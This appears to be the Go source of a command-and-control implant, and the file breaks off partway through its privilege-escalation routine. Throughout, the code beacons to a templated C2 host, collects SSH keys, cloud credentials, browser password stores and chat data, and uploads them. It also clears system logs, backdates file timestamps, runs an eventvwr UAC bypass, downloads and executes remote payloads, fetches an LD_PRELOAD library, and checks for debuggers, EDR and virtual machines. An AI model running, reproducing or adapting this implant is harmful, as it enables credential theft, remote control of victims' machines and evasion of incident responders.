//main.go
package main

import (
    "bytes"
    "context"
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "crypto/tls"
    "compress/gzip"
    "archive/tar"
    "encoding/base64"
    "encoding/hex"
    "encoding/json"
    "errors"
    "fmt"
    mathrand "math/rand"
    "io"
    "io/ioutil"
    "log"
    "mime/multipart"
    "net"
    "net/http"
    "os"
    "os/exec"
    "os/user"
    "path/filepath"
    "runtime"
    "strconv"
    "strings"
    "time"
    "sync"
    "regexp"
    "bufio"
)

var encryptionCtx *PacketEncryptionContext
var stealthModeEnabled bool 
var iamgroot bool 
var discoveredLiveHosts string
var discoverHostsOnce sync.Once
var results_portscan map[string][]int
var proxyCancelFuncs = make(map[string]context.CancelFunc)
var proxyMutex sync.Mutex
var GlobalIP string = ""
var simulationFailed bool
var getipFailed bool
var result_pwd string = ""

const (
    C2_URL     = "https://{lhost}:{lport}"
    CLIENT_ID  = "{line}"
    USERNAME   = "{username}"
    PASSWORD   = "{password}"
    SLEEP      = {sleep} * time.Second
    MALEABLE   = "{maleable}"
    USER_AGENT = "{useragent}"
    MAX_RETRIES = 3
    STEALTH    = "True"
    LHOST      = "{lhost}"
    DESIRED_LD_PRELOAD = "/dev/shm/mrhyde.so"
)


var USER_AGENTS = []string{
    "{useragent}", 
    "{user_agent_1}",
    "{user_agent_2}",
    "{user_agent_3}",
}

var URLS = []string{
    "{url_trafic_1}",
    "{url_trafic_2}",
    "{url_trafic_3}",
}

var HEADERS = map[string]string{
    "Accept":       "application/json",
    "Content-Type": "application/json",
    "Connection":   "keep-alive",
}

var debugTools = map[string][]string{
    "windows": {"x64dbg", "ollydbg", "ida", "windbg", "processhacker", "csfalcon", "cbagent", "msmpeng"},
    "linux":   {"gdb", "strace", "ltrace", "radare2"},
    "darwin":  {"lldb", "dtrace", "instruments"},
}

type Aes256Key struct {
    Key []byte
}

type PacketEncryptionContext struct {
    AesKey  *Aes256Key
    Valid   bool
    Enabled bool
}
type LazyDataType struct {
	ReverseShellPort int    `json:"reverse_shell_port"`
    Rhost            string `json:"rhost"`
    DebugImplant     string `json:"enable_c2_implant_debug"`
    Ports            []int  `json:"beacon_scan_ports"`
}

type HostResult struct {
	IP      string
	Alive   bool
	Interface string
}

func RandomSelectStr(slice []string) string {
	mathrand.Seed(time.Now().UnixNano())
	index := mathrand.Intn(len(slice))
	return slice[index]
}

func GetGlobalIP() string {
    ip := ""
    resolvers := []string{
        "https://api.ipify.org?format=text",
        "http://myexternalip.com/raw",
        "http://ident.me",
        "https://ifconfig.me",
        "https://ifconfig.co",
    }
    maxAttempts := len(resolvers) - 2 

    for attempt := 0; attempt < maxAttempts; attempt++ {
        url := RandomSelectStr(resolvers)
        resp, err := http.Get(url)
        if err != nil {
            log.Printf("[!] Error fetching IP from %s: %v\n", url, err)
            getipFailed = true
            continue
        }

        if resp != nil {
            defer resp.Body.Close()
        }

        i, err := ioutil.ReadAll(resp.Body)
        if err != nil {
            log.Printf("[!] Error reading response from %s: %v\n", url, err)
            getipFailed = true
            continue
        }
        ip = string(i)

        if resp.StatusCode == 200 {
            getipFailed = false
            return ip
        }
        log.Printf("[!] Non-200 status code from %s: %d\n", url, resp.StatusCode)
        getipFailed = true
    }

    log.Println("[!] Failed to obtain global IP from all resolvers")
    return ""
}
func cleanSystemLogs(lazyconf LazyDataType) error {
    var cmd string
    if runtime.GOOS == "windows" {
        cmd = "wevtutil cl System && wevtutil cl Security"
    } else {
        cmd = "truncate -s 0 /var/log/syslog /var/log/messages 2>/dev/null"
    }
    shellCommand := getShellCommand("-c")
    output, err := executeCommandWithRetry(shellCommand, cmd)
    if err != nil {
        if lazyconf.DebugImplant == "True" {
            fmt.Printf("[ERROR] Failed to clean system logs: %v, output: %s\n", err, output)
        }
        return err
    }
    if lazyconf.DebugImplant == "True" {
        fmt.Println("[INFO] System logs cleaned")
    }
    return nil
}

func startProxy(lazyconf LazyDataType, listenAddr, targetAddr string) error {
    ctx, cancel := context.WithCancel(context.Background())

    proxyMutex.Lock()
    proxyCancelFuncs[listenAddr] = cancel
    proxyMutex.Unlock()

    go func() {
        defer globalRecover()

        if lazyconf.DebugImplant == "True" {
            fmt.Printf("[INFO] Starting proxy: listen=%s, target=%s\n", listenAddr, targetAddr)
        }

        listener, err := net.Listen("tcp", listenAddr)
        if err != nil {
            if lazyconf.DebugImplant == "True" {
                fmt.Printf("[ERROR] Failed to start proxy on %s: %v\n", listenAddr, err)
            }
            return
        }
        defer listener.Close()

        if lazyconf.DebugImplant == "True" {
            fmt.Printf("[INFO] Proxy listening on %s, forwarding to %s\n", listenAddr, targetAddr)
        }

        for {
            select {
            case <-ctx.Done():
                if lazyconf.DebugImplant == "True" {
                    fmt.Printf("[INFO] Stopping proxy on %s\n", listenAddr)
                }
                return
            default:
                client, err := listener.Accept()
                if err != nil {
                    if lazyconf.DebugImplant == "True" {
                        fmt.Printf("[ERROR] Proxy accept error: %v\n", err)
                    }
                    continue
                }

                go func() {
                    defer client.Close()
                    target, err := net.Dial("tcp", targetAddr)
                    if err != nil {
                        if lazyconf.DebugImplant == "True" {
                            fmt.Printf("[ERROR] Failed to connect to target %s: %v\n", targetAddr, err)
                        }
                        return
                    }
                    defer target.Close()

                    go io.Copy(target, client)
                    io.Copy(client, target)
                }()
            }
        }
    }()
    return nil
}

func stopProxy(listenAddr string, lazyconf LazyDataType) error {
    proxyMutex.Lock()
    defer proxyMutex.Unlock()
    cancel, exists := proxyCancelFuncs[listenAddr]
    if !exists {
        if lazyconf.DebugImplant == "True" {
            fmt.Printf("[ERROR] No proxy running on %s\n", listenAddr)
        }
        return fmt.Errorf("no proxy running on %s", listenAddr)
    }
    cancel()
    delete(proxyCancelFuncs, listenAddr)
    if lazyconf.DebugImplant == "True" {
        fmt.Printf("[INFO] Proxy stopped on %s\n", listenAddr)
    }
    return nil
}
func GetUsefulSoftware() ([]string, error) {
	var binaries []string = []string{"docker", "nc", "netcat", "python", "python3", "php", "perl", "ruby", "gcc", "g++", "ping", "base64", "socat", "curl", "wget", "certutil", "xterm", "gpg", "mysql", "ssh"}
	var discovered_software []string

	for _, b := range binaries {
		path, _ := exec.LookPath(b)
		discovered_software = append(discovered_software, path)
	}

	return discovered_software, nil
}


func handleAdversary(ctx context.Context, command string, lazyconf LazyDataType, currentPortScanResults map[string][]int) error {
	defer globalRecover()

	if stealthModeEnabled {
		if lazyconf.DebugImplant == "True" {
			fmt.Println("[INFO] Adversary command skipped: stealth mode enabled")
		}
		return nil
	}

	
	idAtomic := strings.TrimPrefix(command, "adversary:")
	if idAtomic == "" || len(idAtomic) != 36 { 
		err := fmt.Errorf("invalid id_atomic: %s", idAtomic)
		if lazyconf.DebugImplant == "True" {
			fmt.Printf("[ERROR] %v\n", err)
		}
		return err
	}

	
	var scriptExt, scriptPrefix string
	var shellCommand []string
	if runtime.GOOS == "windows" {
		scriptExt = ".ps1"
		scriptPrefix = "powershell -Command .\\"
		shellCommand = []string{"powershell", "-Command"}
	} else { 
		scriptExt = ".sh"
		scriptPrefix = "bash "
		shellCommand = []string{"bash", "-c"}
	}

	
	testScript := fmt.Sprintf("atomic_test_%s%s", idAtomic, scriptExt)
	testScriptPath := filepath.Join(func() string { dir, _ := os.Getwd(); return dir }(), testScript)
	downloadCmd := fmt.Sprintf("download:%s", testScript)
	handleDownload(ctx, downloadCmd)
	if _, err := os.Stat(testScriptPath); os.IsNotExist(err) {
		err := fmt.Errorf("failed to download test script: %s", testScript)
		if lazyconf.DebugImplant == "True" {
			fmt.Printf("[ERROR] %v\n", err)
		}
		return err
	}

	
	obfuscateFileTimestamps(lazyconf, testScriptPath)

	
	executeCtx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	go func() {
		defer globalRecover()
		executeCmd := scriptPrefix + testScriptPath
		if lazyconf.DebugImplant == "True" {
			fmt.Printf("[INFO] Executing atomic test: %s\n", executeCmd)
		}
		if err := runScript(executeCtx, executeCmd, shellCommand, lazyconf); err != nil {
			if lazyconf.DebugImplant == "True" {
				fmt.Printf("[ERROR] Test script execution failed: %v\n", err)
			}
		}
	}()

	
	cleanScript := fmt.Sprintf("atomic_clean_test_%s%s", idAtomic, scriptExt)
	cleanScriptPath := filepath.Join(os.TempDir(), cleanScript)
	downloadCmd = fmt.Sprintf("download:%s", cleanScript)
	handleDownload(ctx, downloadCmd)
	if _, err := os.Stat(cleanScriptPath); os.IsNotExist(err) {
		if lazyconf.DebugImplant == "True" {
			fmt.Printf("[WARN] Failed to download cleanup script: %s\n", cleanScript)
		}
	} else {
		
		obfuscateFileTimestamps(lazyconf, cleanScriptPath)

		
		cleanCtx, cleanCancel := context.WithTimeout(context.Background(), 30*time.Second)
		defer cleanCancel()
		go func() {
			defer globalRecover()
			executeCmd := scriptPrefix + cleanScriptPath
			if lazyconf.DebugImplant == "True" {
				fmt.Printf("[INFO] Executing cleanup script: %s\n", executeCmd)
			}
			if err := runScript(cleanCtx, executeCmd, shellCommand, lazyconf); err != nil {
				if lazyconf.DebugImplant == "True" {
					fmt.Printf("[ERROR] Cleanup script execution failed: %v\n", err)
				}
			}
		}()
	}

	
	defer os.Remove(testScriptPath)
	defer os.Remove(cleanScriptPath)

	
	if lazyconf.DebugImplant == "True" {
		fmt.Printf("[INFO] Adversary command completed for id_atomic: %s\n", idAtomic)
	}
	
	return nil
}


func runScript(ctx context.Context, command string, shellCommand []string, lazyconf LazyDataType) error {
	cmd := exec.CommandContext(ctx, shellCommand[0], append(shellCommand[1:], command)...)
	var output bytes.Buffer
	cmd.Stdout = &output
	cmd.Stderr = &output

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start script: %v", err)
	}

	
	go func() {
		defer globalRecover()
		err := cmd.Wait()
		if err != nil && lazyconf.DebugImplant == "True" {
			fmt.Printf("[ERROR] Script execution failed: %v\n", err)
		}

		
		pid := os.Getpid()
		hostname, _ := os.Hostname()
		ips := getIPs()
		currentUser, _ := user.Current()

		jsonData, _ := json.Marshal(map[string]interface{}{
			"output":          output.String(),
			"client":          runtime.GOOS,
			"command":         command,
			"pid":             strconv.Itoa(pid),
			"hostname":        hostname,
			"ips":             strings.Join(ips, ", "),
			"user":            currentUser.Username,
			"discovered_ips":  discoveredLiveHosts,
			"result_portscan": nil,
            "result_pwd": result_pwd, 
		})

		if lazyconf.DebugImplant == "True" {
			var prettyJSON bytes.Buffer
			json.Indent(&prettyJSON, jsonData, "", "  ")
			fmt.Println("[INFO] JSON Data (Formatted):")
			fmt.Println(prettyJSON.String())
		}
		retryRequest(ctx, C2_URL+MALEABLE+CLIENT_ID, "POST", string(jsonData), "")
	}()

	return nil
}
func downloadAndExecute(ctx context.Context, fileURL string, lazyconf LazyDataType) {
	go func() {
		defer globalRecover()

		var filePath string

		if runtime.GOOS == "windows" {
			// Directorio temporal en Windows
			tmpPath := os.Getenv("APPDATA") + "\\"
			filePath = tmpPath + "payload.exe"

			// Descarga el archivo
			client := http.Client{Timeout: 30 * time.Second}
			req, err := http.NewRequestWithContext(ctx, "GET", fileURL, nil)
			if err != nil {
				if lazyconf.DebugImplant == "True" {
					fmt.Printf("[ERROR] Error creating download request for %s: %v\n", fileURL, err)
				}
				return
			}

			resp, err := client.Do(req)
			if err != nil {
				if lazyconf.DebugImplant == "True" {
					fmt.Printf("[ERROR] Error downloading file from %s: %v\n", fileURL, err)
				}
				return
			}
			defer resp.Body.Close()

			if resp.StatusCode != http.StatusOK {
				if lazyconf.DebugImplant == "True" {
					fmt.Printf("[ERROR] Failed to download file from %s, status code: %d\n", fileURL, resp.StatusCode)
				}
				return
			}

			file, err := os.Create(filePath)
			if err != nil {
				if lazyconf.DebugImplant == "True" {
					fmt.Printf("[ERROR] Error creating file %s: %v\n", filePath, err)
				}
				return
			}
			defer file.Close()

			_, err = io.Copy(file, resp.Body)
			if err != nil {
				if lazyconf.DebugImplant == "True" {
					fmt.Printf("[ERROR] Error saving file to %s: %v\n", filePath, err)
				}
				return
			}

			// Ejecutar UAC bypass en Windows
			err = executeUACBypass(filePath, lazyconf)
			if err != nil {
				if lazyconf.DebugImplant == "True" {
					fmt.Printf("[ERROR] Error executing UAC bypass: %v\n", err)
				}
				return
			}

			if lazyconf.DebugImplant == "True" {
				fmt.Printf("[INFO] Payload executed via UAC bypass: %s\n", filePath)
			}
		} else {
			// Lógica para Linux
			tmpDir := "/dev/shm"
			fileName := filepath.Base(fileURL)
			filePath = filepath.Join(tmpDir, fileName)

			client := http.Client{Timeout: 30 * time.Second}
			req, err := http.NewRequestWithContext(ctx, "GET", fileURL, nil)
			if err != nil {
				if lazyconf.DebugImplant == "True" {
					fmt.Printf("[ERROR] Error creating download request for %s: %v\n", fileURL, err)
				}
				return
			}

			resp, err := client.Do(req)
			if err != nil {
				if lazyconf.DebugImplant == "True" {
					fmt.Printf("[ERROR] Error downloading file from %s: %v\n", fileURL, err)
				}
				return
			}
			defer resp.Body.Close()

			if resp.StatusCode != http.StatusOK {
				if lazyconf.DebugImplant == "True" {
					fmt.Printf("[ERROR] Failed to download file from %s, status code: %d\n", fileURL, resp.StatusCode)
				}
				return
			}

			file, err := os.OpenFile(filePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0755)
			if err != nil {
				if lazyconf.DebugImplant == "True" {
					fmt.Printf("[ERROR] Error opening file %s: %v\n", filePath, err)
				}
				return
			}
			defer file.Close()

			_, err = io.Copy(file, resp.Body)
			if err != nil {
				if lazyconf.DebugImplant == "True" {
					fmt.Printf("[ERROR] Error saving file to %s: %v\n", filePath, err)
				}
				return
			}

			cmd := exec.Command(filePath)
			if err := cmd.Start(); err != nil {
				if lazyconf.DebugImplant == "True" {
					fmt.Printf("[ERROR] Error starting executable %s: %v\n", filePath, err)
				}
				return
			}

			if lazyconf.DebugImplant == "True" {
				fmt.Printf("[INFO] Background process started: %s\n", filePath)
			}
		}
	}()
}

func executeUACBypass(filePath string, lazyconf LazyDataType) error {
	if runtime.GOOS != "windows" {
		if lazyconf.DebugImplant == "True" {
			fmt.Println("[WARNING] UAC bypass is not applicable on non-Windows platforms")
		}
		return fmt.Errorf("UAC bypass not supported on this platform")
	}

	// Añadir clave al registro
	cmd := exec.Command("cmd", "/Q", "/C", "reg", "add", "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command", "/d", filePath)
	_, err := cmd.Output()
	if err != nil {
		return fmt.Errorf("error setting registry key: %v", err)
	}

	// Ejecutar eventvwr.exe
	c := exec.Command("cmd", "/C", "eventvwr.exe")
	if err := c.Run(); err != nil {
		return fmt.Errorf("error running eventvwr.exe: %v", err)
	}

	// Limpiar el registro
	cmd = exec.Command("cmd", "/Q", "/C", "reg", "delete", "HKCU\\Software\\Classes\\mscfile", "/f")
	_, err = cmd.Output()
	if err != nil {
		return fmt.Errorf("error deleting registry key: %v", err)
	}

	return nil
}
func obfuscateFileTimestamps(lazyconf LazyDataType, filePath string) error {
    oldTime := time.Now().AddDate(-1, 0, 0)
    if err := os.Chtimes(filePath, oldTime, oldTime); err != nil {
        if lazyconf.DebugImplant == "True" {
            fmt.Printf("[ERROR] Failed to obfuscate timestamps for %s: %v\n", filePath, err)
        }
        return err
    }
    if lazyconf.DebugImplant == "True" {
        fmt.Printf("[INFO] Timestamps obfuscated for %s to %v\n", filePath, oldTime)
    }
    
    return nil
}
func handleExfiltrate(ctx context.Context, command string, lazyconf LazyDataType) {
	if lazyconf.DebugImplant == "True" {
		fmt.Println("[INFO] Executing file scraping...")
	}

	userObj, err := user.Current()
	if err != nil {
		fmt.Printf("[ERROR] Could not get current user: %v\n", err)
		return
	}
	homeDir := userObj.HomeDir

	sensitiveFiles := []string{
        filepath.Join(homeDir, ".bash_history"),        
        filepath.Join(homeDir, ".ssh", "id_rsa"),        
        filepath.Join(homeDir, ".ssh", "id_dsa"),        
        filepath.Join(homeDir, ".ssh", "id_ecdsa"),        
        filepath.Join(homeDir, ".ssh", "id_ed25519"),        
        filepath.Join(homeDir, "Desktop", "*.log"),        
        filepath.Join(homeDir, ".ssh", "authorized_keys"),        
        filepath.Join(homeDir, ".aws", "credentials"),        
        filepath.Join(homeDir, ".aws", "config*"),        
        filepath.Join(homeDir, ".zsh_history"),        
        filepath.Join(homeDir, ".config/fish/fish_history"),        
        filepath.Join(homeDir, ".gnupg", "secring.gpg"),        
        filepath.Join(homeDir, ".gnupg", "pubring.gpg"),        
        filepath.Join(homeDir, ".password-store", "*"),
        filepath.Join(homeDir, ".keepassxc", "*.kdbx"),
        filepath.Join(homeDir, "Documents", "*.kdbx"),        
        filepath.Join(homeDir, "Downloads", "github-recovery-codes.txt"),  
        filepath.Join(homeDir, "Descargas", "github-recovery-codes.txt"),  
        filepath.Join(homeDir, ".config", "google-chrome", "Default", "Login Data"),
        filepath.Join(homeDir, ".mozilla", "firefox", "*", "key4.db"),
        filepath.Join(homeDir, ".mozilla", "firefox", "*", "logins.json"),
        filepath.Join(homeDir, ".config", "microsoft", "Edge", "Default", "Login Data"),
        filepath.Join(homeDir, "Library", "Application Support", "BraveSoftware", "*", "Login Data"),
        filepath.Join(homeDir, "Library", "Application Support", "Google", "Chrome", "Default", "Login Data"),
        filepath.Join(homeDir, "~/Library/Safari/Bookmarks.plist"),
        filepath.Join(homeDir, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
        filepath.Join(homeDir, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles", "*", "key4.db"),
        filepath.Join(homeDir, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles", "*", "logins.json"),
        filepath.Join(homeDir, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data"),
        filepath.Join(homeDir, "AppData", "Roaming", "*.ps1_history.txt"),
        filepath.Join(homeDir, ".purple", "accounts.xml"),
        filepath.Join(homeDir, ".irssi", "config"),
        filepath.Join(homeDir, ".mutt", "*"),
        filepath.Join(homeDir, ".abook", "abook"),
        filepath.Join(homeDir, ".thunderbird", "*", "prefs.js"),
        filepath.Join(homeDir, ".thunderbird", "*", "Mail", "*", "*"),
        filepath.Join(homeDir, ".wireshark", "recent"),
        filepath.Join(homeDir, ".config", "transmission", "torrents.json"),
        filepath.Join(homeDir, ".wget-hsts"),
        filepath.Join(homeDir, ".git-credentials"),
        filepath.Join(homeDir, ".npmrc"),
        filepath.Join(homeDir, ".yarnrc"),
        filepath.Join(homeDir, ".bundle", "config"),
        filepath.Join(homeDir, ".gem", "*", "credentials"),
        filepath.Join(homeDir, ".pypirc"),
        filepath.Join(homeDir, ".ssh", "config"),
        filepath.Join(homeDir, "~/.aws/config"),
        filepath.Join(homeDir, "~/.oci/config"),
        filepath.Join(homeDir, "~/.kube/config"),
        filepath.Join(homeDir, "~/.docker/config.json"),
        filepath.Join(homeDir, "~/.netrc"),
        filepath.Join(homeDir, "~/Library/Application Support/com.apple.iChat/Aliases"),
        filepath.Join(homeDir, "~/Library/Messages/chat.db"),
        filepath.Join(homeDir, "~/Library/Containers/com.apple.mail/Data/Library/Mail/V*/MailData/Accounts.plist"),
        filepath.Join(homeDir, "~/Library/Containers/com.apple.Safari/Data/Library/Safari/Bookmarks.plist"),
        filepath.Join(homeDir, "~/Library/Containers/com.apple.Safari/Data/Library/Safari/History.plist"),
        filepath.Join(homeDir, "~/Library/Preferences/com.apple.finder.plist"),
        filepath.Join(homeDir, "~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist"),
        filepath.Join(homeDir, "~/Library/Application Support/Code/User/settings.json"),
        filepath.Join(homeDir, "~/Library/Application Support/Slack/local_store.json"),
        filepath.Join(homeDir, "~/Library/Application Support/Telegram Desktop/tdata/*"),
        filepath.Join(homeDir, "~/Library/Cookies/Cookies.binarycookies"),
    }

	passwordPatterns := []*regexp.Regexp{
		regexp.MustCompile(`(?i)password\s*[:=]\s*"?(.+?)"?\s*$`),
		regexp.MustCompile(`(?i)passwd\s*[:=]\s*"?(.+?)"?\s*$`),

	}

	var wg sync.WaitGroup
	foundFilesChan := make(chan string, 10)
	errorChan := make(chan error, 5)

	scanPath := func(path string) {
		defer wg.Done()
		if strings.Contains(path, "*") {
			matches, err := filepath.Glob(path)
			if err != nil {
				errorChan <- fmt.Errorf("error processing glob pattern '%s': %v", path, err)
				return
			}
			for _, match := range matches {
				if isSensitiveFile(match, passwordPatterns) {
					foundFilesChan <- match
				}
			}
		} else {
			if isSensitiveFile(path, passwordPatterns) {
				foundFilesChan <- path
			}
		}
	}

	for _, file := range sensitiveFiles {
		wg.Add(1)
		go scanPath(file)
	}

	go func() {
		wg.Wait()
		close(foundFilesChan)
		close(errorChan)
	}()

	for foundFile := range foundFilesChan {
		if lazyconf.DebugImplant == "True" {
			fmt.Printf("[INFO] Found potentially sensitive file: %s\n", foundFile)
		}
		uploadFile(ctx, foundFile)
	}

	for err := range errorChan {
		fmt.Printf("[ERROR] Error during file scraping: %v\n", err)
	}

	if lazyconf.DebugImplant == "True" {
		fmt.Println("[INFO] File scraping finished.")
	}
}
func compressGzipDir(ctx context.Context, inputDir string, outputFilePath string, lazyconf LazyDataType) error {
	if lazyconf.DebugImplant == "True" {
		fmt.Printf("[INFO] Starting directory compression: %s to %s\n", inputDir, outputFilePath)
	}

	outputFile, err := os.Create(outputFilePath)
	if err != nil {
		return fmt.Errorf("failed to create output file '%s': %v", outputFilePath, err)
	}
	defer outputFile.Close()

	gzipWriter := gzip.NewWriter(outputFile)
	defer gzipWriter.Close()

	tarWriter := tar.NewWriter(gzipWriter)
	defer tarWriter.Close()

	err = filepath.Walk(inputDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() {
			return nil 
		}

		if lazyconf.DebugImplant == "True" {
			fmt.Printf("[DEBUG] Adding file to archive: %s\n", path)
		}

		file, err := os.Open(path)
		if err != nil {
			return fmt.Errorf("failed to open file '%s': %v", path, err)
		}
		defer file.Close()

		
		header, err := tar.FileInfoHeader(info, "")
		if err != nil {
			return fmt.Errorf("failed to create tar header for '%s': %v", path, err)
		}

		
		relativePath, err := filepath.Rel(inputDir, path)
		if err != nil {
			return err
		}
		header.Name = relativePath

		if err := tarWriter.WriteHeader(header); err != nil {
			return fmt.Errorf("failed to write tar header for '%s': %v", path, err)
		}

		if _, err := io.Copy(tarWriter, file); err != nil {
			return fmt.Errorf("failed to copy content of '%s' to tar archive: %v", path, err)
		}
		return nil
	})

	if err != nil {
		return err
	}

	if lazyconf.DebugImplant == "True" {
		fmt.Printf("[INFO] Directory compression finished. Uploading: %s\n", outputFilePath)
	}

	uploadFile(ctx, outputFilePath)
	return nil
}
func isSensitiveFile(path string, passwordPatterns []*regexp.Regexp) bool {
	fileInfo, err := os.Stat(path)
	if err != nil || fileInfo.IsDir() {
		return false
	}

	filename := filepath.Base(path)
	if strings.Contains(filename, "id_rsa") || strings.Contains(filename, "id_dsa") ||
		strings.Contains(filename, "id_ecdsa") || strings.Contains(filename, "id_ed25519") ||
		filename == ".bash_history" {
		return true
	}

	file, err := os.Open(path)
	if err != nil {
		fmt.Printf("[WARNING] Could not open file '%s' for password scanning: %v\n", path, err)
		return false
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		for _, pattern := range passwordPatterns {
			if pattern.MatchString(line) {
				return true
			}
		}
	}
	return false
}

func uploadFile(ctx context.Context, filePath string) {
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		fmt.Printf("[WARNING] File not found for upload: %s\n", filePath)
		return
	}
	if _, err := retryRequest(ctx, C2_URL+MALEABLE+"/upload", "POST", "", filePath); err != nil {
		fmt.Printf("[ERROR] Failed to upload file '%s': %v\n", filePath, err)
	} else {
		fmt.Printf("[INFO] Successfully uploaded file: %s\n", filepath.Base(filePath))
	}
}


func PortScanner(ips string, ports []int, timeout time.Duration) map[string][]int {
	ipList := strings.Split(strings.ReplaceAll(ips, " ", ""), ",")
    fmt.Printf("[INFO] Starting port scan on %s IPs...\n", ips)
	results := make(map[string][]int)
	var mu sync.Mutex
	var wg sync.WaitGroup
	resultChan := make(chan struct {
		ip    string
		port  int
		open  bool
	}, 100)
	scan := func(ip string, port int) {
		defer wg.Done()
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), timeout)
		if err == nil {
			conn.Close()
			resultChan <- struct {
				ip    string
				port  int
				open  bool
			}{ip, port, true}
		} else {
			resultChan <- struct {
				ip    string
				port  int
				open  bool
			}{ip, port, false}
		}
	}
	for _, ip := range ipList {
		for _, port := range ports {
			wg.Add(1)
			go scan(ip, port)
		}
	}
	go func() {
		wg.Wait()
		close(resultChan)
	}()
	for res := range resultChan {
		if res.open {
			mu.Lock()
			results[res.ip] = append(results[res.ip], res.port)
			mu.Unlock()
		}
	}

	return results
}

func isRoot() bool {
	if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
		return os.Getuid() == 0
	}
	return false
}

func pingHost(ip, iface string, timeout time.Duration, results chan<- HostResult, wg *sync.WaitGroup) {
	defer func() {
        if r := recover(); r != nil {
            fmt.Printf("[ERROR] Panic en pingHost para %s: %v\n", ip, r)
        }
        wg.Done()
    }()

	cmd := exec.Command("ping", "-c", "1", "-W", fmt.Sprintf("%d", int(timeout.Seconds())), ip)
	err := cmd.Run()

	results <- HostResult{IP: ip, Alive: err == nil, Interface: iface}
}

func generateIPRange(ipNet *net.IPNet) ([]string, error) {
	var ips []string
	ip := ipNet.IP.To4()
	mask := ipNet.Mask

	start := ipToInt(ip)
	ones, _ := mask.Size()
	numIPs := 1 << (32 - ones) 

	for i := uint32(0); i < uint32(numIPs); i++ {
		ips = append(ips, intToIP(start+i).String())
	}
	return ips, nil
}

func ipToInt(ip net.IP) uint32 {
	ip = ip.To4()
	return uint32(ip[0])<<24 | uint32(ip[1])<<16 | uint32(ip[2])<<8 | uint32(ip[3])
}

func intToIP(n uint32) net.IP {
	return net.IPv4(byte(n>>24), byte(n>>16), byte(n>>8), byte(n))
}

func ReadJSONFromURL(url string, target interface{}) error {
	client := http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
	}

	response, err := client.Get(url)
	if err != nil {
		return fmt.Errorf("error GET a %s: %w", url, err)
	}
	defer response.Body.Close()

	if response.StatusCode < http.StatusOK || response.StatusCode >= http.StatusBadRequest {
		bodyBytes, _ := io.ReadAll(response.Body)
		return fmt.Errorf("Request %s error code: %d: %s", url, response.StatusCode, string(bodyBytes))
	}

	err = json.NewDecoder(response.Body).Decode(target)
	if err != nil {
		return fmt.Errorf("Error decode JSON de %s: %w", url, err)
	}
	return nil
}

func discoverLocalHosts(lazyconf LazyDataType) {
	var liveHosts []string
	timeout := 2 * time.Second
	results := make(chan HostResult)
	var wg sync.WaitGroup
    var rhost string
	rhost = lazyconf.Rhost
	interfaces, err := net.Interfaces()
	if err == nil {
		for _, iface := range interfaces {
            if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 || iface.Name == "docker0" {
                if lazyconf.DebugImplant == "True" {
                    fmt.Printf("[DEBUG] Ignorando interfaz: %s\n", iface.Name)
                }
                continue
            }
			addrs, err := iface.Addrs()
			if err == nil {
				for _, addr := range addrs {
					ipNet, ok := addr.(*net.IPNet)
					if ok && ipNet.IP.To4() != nil {
						subnetIPs, err := generateIPRange(ipNet)
						if err == nil {
							for _, ip := range subnetIPs {
								wg.Add(1)
								go pingHost(ip, iface.Name, timeout, results, &wg)
							}
						}
					}
				}
			}
		}
        wg.Add(1)
        go pingHost(rhost, "tun0", timeout, results, &wg)
		go func() {
			wg.Wait()
			close(results)
		}()

		for result := range results {
			if result.Alive {
                if lazyconf.DebugImplant == "True" {
				    fmt.Printf("[INFO] Discovered Host (Startup): %s en interfaz %s\n", result.IP, result.Interface)
                }
				liveHosts = append(liveHosts, result.IP)
			}
		}
		discoveredLiveHosts = strings.Join(liveHosts, ", ")
	} else {
        if lazyconf.DebugImplant == "True" {
		    fmt.Println("[ERROR] Error obteniendo interfaces para el escaneo de hosts (Startup):", err)
        }
		discoveredLiveHosts = "error"
	}
}

func isVMByMAC() bool {
    interfaces, err := net.Interfaces()
    if err != nil {
        fmt.Println("Error get network interface:", err)
        return false
    }

    vmMACPrefixes := []string{
        "00:05:69", "00:0C:29", "00:50:56", 
        "08:00:27",                        
        "52:54:00",                        
    }

    for _, iface := range interfaces {
    if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 || iface.Name == "docker0" {
        continue
    }
        mac := iface.HardwareAddr.String()
        for _, prefix := range vmMACPrefixes {
            if strings.HasPrefix(mac, prefix) {
                return true
            }
        }
    }

    return false
}
func ifRoot(lazyconf LazyDataType) bool {
    if lazyconf.DebugImplant == "True" {
        println("[INFO] Running with root privileges (Linux/macOS)")
    }
    iamgroot = true
    ldPreload := os.Getenv("LD_PRELOAD")
    serv_url := "https://{lhost}/l_{line}"
    baseCtx := context.Background()
	go downloadAndExecute(baseCtx, serv_url, lazyconf)
    if ldPreload == "" || ldPreload != DESIRED_LD_PRELOAD {
        if _, err := os.Stat(DESIRED_LD_PRELOAD); os.IsNotExist(err) {
            cmd := exec.Command("bash", "-c", fmt.Sprintf("curl -o /home/.grisun0/mrhyde.so http://"+LHOST+"/mrhyde.so"))
            cmd.Run()
        }
        os.Setenv("LD_PRELOAD", DESIRED_LD_PRELOAD)
        return true
    }
    return false
}
func tryPrivilegeEscalation(lazyconf LazyDataType) {
    
    go func() {
        defer globalRecover()

        if runtime.GOOS != "linux" {
            if lazyconf.DebugImplant == "True" {
                fmt.Println("[INFO] Privilege escalation check only supported on Linux")
            }
            return
        }

        
        shellCommand := getShellCommand("-c")
